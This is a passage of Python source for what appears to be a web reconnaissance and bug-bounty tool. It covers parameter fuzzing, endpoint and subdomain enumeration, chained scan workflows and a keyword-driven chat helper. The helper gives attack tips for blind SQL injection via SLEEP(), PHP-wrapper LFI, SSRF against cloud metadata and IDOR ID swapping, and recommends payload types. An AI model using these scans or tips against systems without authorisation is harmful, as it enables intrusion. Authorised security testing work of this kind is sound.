    )

    result = {
        "target": url,
        "paths_probed": len(ENDPOINT_PATHS),
        "endpoints_found": len(found),
        "endpoints": found,
        "all_results": sorted(all_results, key=lambda x: str(x["status"])),
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"endpoints:{url}", result, ttl=300)
    set_last_scan(f"endpoints:{url}", result)
    return result


# ── Find Params ────────


def find_params(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    cached = _cache.get(f"params:{url}")
    if cached:
        return cached

    base_res, _ = _make_request(url)
    base_status = None
    base_size = 0
    if base_res is not None:
        base_status = base_res.status if hasattr(base_res, "status") else base_res.code
        try:
            base_size = len(base_res.read())
        except Exception:
            pass

    def _probe_param(param: dict):
        name = param["name"]
        probe = f"{url}?{name}=FUZZ"
        res, _ = _make_request(probe, timeout=4)
        if res is None:
            return None
        status = res.status if hasattr(res, "status") else res.code
        try:
            size = len(res.read())
        except Exception:
            size = 0
        diff = abs(size - base_size) > 50 if base_size else False
        status_diff = (status != base_status) if base_status else False
        return {
            "name": name,
            "risk": param["risk"],
            "test": param["test"],
            "url": probe,
            "status": status,
            "size": size,
            "interesting": diff or status_diff,
        }

    results = []
    with ThreadPoolExecutor(max_workers=15) as pool:
        futures = [pool.submit(_probe_param, p) for p in COMMON_PARAMS]
        for f in as_completed(futures):
            r = f.result()
            if r is not None:
                results.append(r)

    results.sort(
        key=lambda x: (not x["interesting"], x["risk"] != "high", x["risk"] != "medium")
    )

    interesting = [r for r in results if r["interesting"]]
    high_risk = [r for r in results if r["risk"] == "high"]

    summary = [
        f"Tested {len(results)} common parameters.",
        f"{len(interesting)} parameter(s) produced different responses (potentially injectable).",
        f"{len(high_risk)} high-risk parameter(s) present.",
    ]

    next_steps = [f"?{r['name']}= — {r['test']}" for r in interesting[:5]]
    if not next_steps:
        next_steps = [
            "No params produced different responses — site may not reflect params.",
            "Try parameters in POST body or JSON format.",
            "Check JavaScript files for additional parameter names.",
        ]

    result = {
        "target": url,
        "params_tested": len(results),
        "interesting": interesting,
        "all_params": results,
        "high_risk": high_risk,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"params:{url}", result, ttl=300)
    set_last_scan(f"params:{url}", result)
    return result


# ── Workflow ───────


def run_workflow(target: str) -> dict:
    url = target if target.startswith(("http://", "https://")) else f"https://{target}"
    domain = (
        target.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"workflow:{target}")
    if cached:
        return cached

    t0 = time.time()

    with ThreadPoolExecutor(max_workers=2) as pool:
        f_recon = pool.submit(recon_domain, domain)
        f_analyze = pool.submit(analyze_url, url)
    recon_data = f_recon.result()
    analyze_data = f_analyze.result()

    with ThreadPoolExecutor(max_workers=3) as pool:
        f_bb = pool.submit(bb_scan, url)
        f_endpoints = pool.submit(find_endpoints, url)
        f_params = pool.submit(find_params, url)
    bb_data = f_bb.result()
    endpoints_data = f_endpoints.result()
    params_data = f_params.result()

    elapsed = round(time.time() - t0, 2)

    all_next = list(
        dict.fromkeys(
            recon_data.get("next_steps", [])
            + analyze_data.get("next_steps", [])
            + bb_data.get("next_steps", [])
            + endpoints_data.get("next_steps", [])
            + params_data.get("next_steps", [])
        )
    )

    smart_summary = (
        ["=== RECON ==="]
        + recon_data.get("smart_summary", [])
        + ["=== URL ANALYSIS ==="]
        + (
            analyze_data.get("misconfig_hints", [])[:3]
            or ["No misconfigurations detected."]
        )
        + ["=== PATH SCAN ==="]
        + bb_data.get("smart_summary", [])
        + ["=== ENDPOINTS ==="]
        + endpoints_data.get("smart_summary", [])
        + ["=== PARAMETERS ==="]
        + params_data.get("smart_summary", [])
    )

    result = {
        "target": target,
        "elapsed_seconds": elapsed,
        "recon": recon_data,
        "analysis": analyze_data,
        "bb_scan": bb_data,
        "endpoints": endpoints_data,
        "params": params_data,
        "next_steps": all_next,
        "smart_summary": smart_summary,
    }
    _cache.set(f"workflow:{target}", result, ttl=300)
    set_last_scan(target, result)
    return result


# ── Chat Assist ────────────


def chat_assist(question: str, scan_result: dict = None) -> dict:
    q = question.lower().strip()
    response = []
    sources = []
    ctx = scan_result or get_last_scan().get("data", {})

    if any(
        w in q
        for w in ["test", "what should", "next step", "start", "begin", "do next"]
    ):
        steps = ctx.get("next_steps") or ctx.get("recon", {}).get("next_steps", [])
        if steps:
            response = steps[:8]
            sources.append("next_steps from last scan")
        else:
            response = [
                "Run /workflow?target=<domain> for the full automated pipeline.",
                "Or start with /recon?domain=<target> for host intelligence.",
                "Then /expand?domain=<target> for subdomain discovery.",
                "Run /bb-scan?url=<target> for path probing.",
                "Use /params?url=<target> to find injectable parameters.",
            ]

    elif any(w in q for w in ["subdomain", "expand", "subdomains"]):
        expand = ctx.get("subdomains") or []
        if expand:
            live = [s["subdomain"] for s in expand if s.get("live")]
            response = [f"Found {len(live)} live subdomain(s):"] + live[:10]
        else:
            response = ["No subdomain data. Run /expand?domain=<target> first."]

    elif any(w in q for w in ["param", "parameter", "injectable"]):
        params = (
            ctx.get("params", {}).get("interesting") or ctx.get("interesting") or []
        )
        if params:
            response = [
                f"?{p['name']}= is interesting — {p['test']}" for p in params[:6]
            ]
        else:
            response = ["No parameter data. Run /params?url=<target> first."]

    elif any(w in q for w in ["endpoint", "path", "route", "api"]):
        eps = (
            ctx.get("endpoints", {}).get("endpoints")
            or ctx.get("interesting_paths")
            or []
        )
        if eps:
            response = [f"{e.get('path')} -> {e.get('status')}" for e in eps[:8]]
        else:
            response = [
                "No endpoint data. Run /endpoints?url=<target> or /bb-scan first."
            ]

    elif any(w in q for w in ["vulnerable", "vuln", "risk", "issue", "problem"]):
        summary = ctx.get("smart_summary") or ctx.get("recon", {}).get(
            "smart_summary", []
        )
        hints = ctx.get("misconfig_hints") or ctx.get("analysis", {}).get(
            "misconfig_hints", []
        )
        missing = ctx.get("missing_security_headers") or ctx.get("recon", {}).get(
            "missing_security_headers", []
        )
        if summary:
            response += summary[:6]
            sources.append("smart_summary")
        if hints:
            response += hints[:4]
            sources.append("misconfig_hints")
        if missing:
            response.append(f"Missing headers: {', '.join(missing)}")
        if not response:
            response = ["No scan data. Run /recon or /workflow first."]

    elif any(w in q for w in ["header", "hsts", "csp", "cors", "x-frame"]):
        missing = ctx.get("missing_security_headers") or ctx.get("recon", {}).get(
            "missing_security_headers", []
        )
        if missing:
            response = [f"Missing: {h}" for h in missing]
            response.append(
                "These headers prevent XSS, clickjacking, and MITM attacks."
            )
        else:
            response = ["No missing headers in last scan, or no scan data available."]

    elif any(
        w in q
        for w in ["payload", "xss", "sqli", "sql", "lfi", "ssrf", "redirect", "idor"]
    ):
        ptype = next(
            (
                w
                for w in ["xss", "sqli", "lfi", "ssrf", "open_redirect", "idor"]
                if w in q
            ),
            "xss",
        )
        tips = {
            "xss": "Test in URL params, form inputs, and reflected headers.",
            "sqli": "Try in login fields and search. Use SLEEP() to confirm blind SQLi.",
            "lfi": "Replace file path params. Try PHP wrappers on PHP sites.",
            "ssrf": "Inject into URL/webhook/callback fields. Test cloud metadata.",
            "open_redirect": "Inject into redirect=/next=/return= params.",
            "idor": "Replace numeric IDs: try 0, -1, other user IDs.",
        }
        response = [
            f"Use /payloads?type={ptype} to get categorized payloads.",
            tips.get(ptype, ""),
        ]

    elif any(w in q for w in ["ssl", "cert", "certificate", "https", "tls"]):
        ssl_data = ctx.get("ssl") or ctx.get("recon", {}).get("ssl", {})
        if ssl_data and ssl_data.get("valid"):
            response.append(
                f"SSL valid. Expires: {ssl_data.get('expires')} ({ssl_data.get('days_remaining')} days left)."
            )
            if ssl_data.get("san"):
                response.append(f"SAN entries: {', '.join(ssl_data['san'][:4])}")
            if ssl_data.get("warning"):
                response.append(ssl_data["warning"])
        elif ssl_data:
            response.append(f"SSL issue: {ssl_data.get('error')}")
        else:
            response = ["No SSL data. Run /recon?domain=<target> first."]

    elif any(w in q for w in ["dns", "mx", "ns", "txt", "record"]):
        dns = ctx.get("dns") or ctx.get("recon", {}).get("dns", {})
        if dns:
            for rtype, records in dns.items():
                response.append(f"{rtype}: {', '.join(records[:3])}")
        else:
            response = ["No DNS data. Run /recon?domain=<target> first."]

    elif any(w in q for w in ["ip", "server", "tech", "stack", "technology"]):
        recon = ctx if "ip" in ctx else ctx.get("recon", {})
        if recon.get("ip"):
            response.append(f"IP: {recon['ip']}")
        if recon.get("tech_hints"):
            response += recon["tech_hints"]
        if not response:
            response = ["No recon data. Run /recon?domain=<target> first."]

    else:
        response = [
            "I can answer: test suggestions, subdomains, params, endpoints, vulns, headers, payloads, SSL, DNS.",
            "Try: 'What should I test?', 'What parameters are injectable?', 'What subdomains were found?'",
        ]

    return {
        "question": question,
        "response": response,
        "sources": sources,
        "tip": "Run /workflow?target=<domain> for the full automated pipeline.",
    }


# ── Workflow: Express ────────


def run_workflow_express(target: str) -> dict:
    """Fast workflow: recon + analyze-url only. ~3-5s."""
    url = target if target.startswith(("http://", "https://")) else f"https://{target}"
    domain = (
        target.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"wf_express:{target}")
    if cached:
        return cached

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=2) as pool:
        f_recon = pool.submit(recon_domain, domain)
        f_analyze = pool.submit(analyze_url, url)
    recon_data = f_recon.result()
    analyze_data = f_analyze.result()

    elapsed = round(time.time() - t0, 2)

    summary = recon_data.get("smart_summary", []) + (
        analyze_data.get("misconfig_hints", [])[:2] or []
    )
    next_steps = list(
        dict.fromkeys(
            recon_data.get("next_steps", []) + analyze_data.get("next_steps", [])
        )
    )

    result = {
        "mode": "express",
        "target": target,
        "elapsed_seconds": elapsed,
        "recon": recon_data,
        "analysis": analyze_data,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"wf_express:{target}", result, ttl=300)
    set_last_scan(target, result)
    return result


# ── Workflow: Bug Bounty ────────

def run_workflow_bugbounty(target: str) -> dict:
    """Bug bounty: recon + bb-scan + recommend relevant payloads."""
    url = target if target.startswith(("http://", "https://")) else f"https://{target}"
    domain = (
        target.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"wf_bb:{target}")
    if cached:
        return cached

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=2) as pool:
        f_recon = pool.submit(recon_domain, domain)
        f_scan = pool.submit(bb_scan, url)
    recon_data = f_recon.result()
    scan_data = f_scan.result()

    recommended = []
    tech = " ".join(recon_data.get("tech_hints", [])).lower()
    missing = recon_data.get("missing_security_headers", [])
    paths = [p["path"] for p in scan_data.get("interesting_paths", [])]

    if "content-security-policy" in missing or any("/login" in p for p in paths):
        recommended.append("xss")
    if any(x in tech for x in ["php", "mysql", "sql"]) or any(
        "/login" in p for p in paths
    ):
        recommended.append("sqli")
    if "php" in tech or any("file" in p for p in paths):
        recommended.append("lfi")
    if any(x in tech for x in ["aws", "cloud", "gcp", "azure"]):
        recommended.append("ssrf")
    if any(x in paths for x in ["/api", "/v1", "/v2"]):
        recommended.append("idor")
    if "x-frame-options" in missing:
        recommended.append("open_redirect")
    if not recommended:
        recommended = ["xss", "sqli", "ssrf"]

    payload_data = {}
    for ptype in recommended[:3]:
        payload_data[ptype] = get_payloads(ptype)

    elapsed = round(time.time() - t0, 2)

    summary = recon_data.get("smart_summary", []) + scan_data.get("smart_summary", [])
    next_steps = list(
        dict.fromkeys(
            recon_data.get("next_steps", []) + scan_data.get("next_steps", [])
        )
    )

    result = {
        "mode": "bugbounty",
        "target": target,
        "elapsed_seconds": elapsed,
        "recon": recon_data,
        "bb_scan": scan_data,
        "recommended_payloads": recommended,
        "payloads": payload_data,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"wf_bb:{target}", result, ttl=300)
    set_last_scan(target, result)
    return result


# ── Workflow: Subdomains ─────────────


def run_workflow_subdomains(domain: str) -> dict:
    """Enumerate subdomains then recon each live one (max 5)."""
    domain = (
        domain.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"wf_subs:{domain}")
    if cached:
        return cached

    t0 = time.time()
    expansion = expand_target(domain)

    live_subs = [
        s["subdomain"] for s in expansion.get("subdomains", []) if s.get("live")
    ][:5]

    subdomain_recons = {}
    if live_subs:
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(recon_domain, sub): sub for sub in live_subs}
            for f in as_completed(futures):
                sub = futures[f]
                subdomain_recons[sub] = f.result()

    elapsed = round(time.time() - t0, 2)

    summary = [
        f"Found {expansion.get('total_found', 0)} subdomain(s), {expansion.get('live_count', 0)} live.",
        f"Ran full recon on {len(subdomain_recons)} subdomain(s).",
    ]
    for sub, r in subdomain_recons.items():
        if r.get("missing_security_headers"):
            summary.append(
                f"{sub}: {len(r['missing_security_headers'])} missing security header(s)."
            )

    next_steps = [
        "Run /bb-scan on each live subdomain.",
        "Check for subdomain takeover: look for dangling CNAMEs.",
        "Test dev/staging subdomains — they often have weaker auth.",
        "Run /workflow on the most interesting subdomain.",
    ]

    result = {
        "mode": "subdomains",
        "domain": domain,
        "elapsed_seconds": elapsed,
        "expansion": expansion,
        "subdomain_recons": subdomain_recons,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"wf_subs:{domain}", result, ttl=600)
    set_last_scan(domain, result)
    return result


# ── Workflow: API ─────────────


def run_workflow_api(url: str) -> dict:
    """API-focused workflow: endpoint enumeration + param probing."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    cached = _cache.get(f"wf_api:{url}")
    if cached:
        return cached

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=2) as pool:
        f_ep = pool.submit(find_endpoints, url)
        f_params = pool.submit(find_params, url)
    endpoints_data = f_ep.result()
    params_data = f_params.result()

    elapsed = round(time.time() - t0, 2)

    api_eps = [
        ep for ep in endpoints_data.get("endpoints", []) if ep.get("type") == "api"
    ]

    summary = endpoints_data.get("smart_summary", []) + params_data.get(
        "smart_summary", []
    )
    next_steps = list(
        dict.fromkeys(
            endpoints_data.get("next_steps", []) + params_data.get("next_steps", [])
        )
    )

    result = {
        "mode": "api",
        "target": url,
        "elapsed_seconds": elapsed,
        "endpoints": endpoints_data,
        "params": params_data,
        "api_endpoints_found": len(api_eps),
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"wf_api:{url}", result, ttl=300)
    set_last_scan(url, result)
    return result


# ── Cache utilities ─────────────


def get_cache_status() -> dict:
    with _cache._lock:
        now = time.time()
        active, expired = 0, 0
        keys = []
        for k, v in _cache._store.items():
            if now - v["ts"] > v["ttl"]:
                expired += 1
            else:
                active += 1
                keys.append(k)
        return {
            "total_entries": active + expired,
            "active_entries": active,
            "expired_entries": expired,
            "keys": keys,
        }


def clear_cache() -> dict:
    with _cache._lock:
        count = len(_cache._store)
        _cache._store.clear()
    return {"cleared": count, "message": f"Cleared {count} cache entries."}
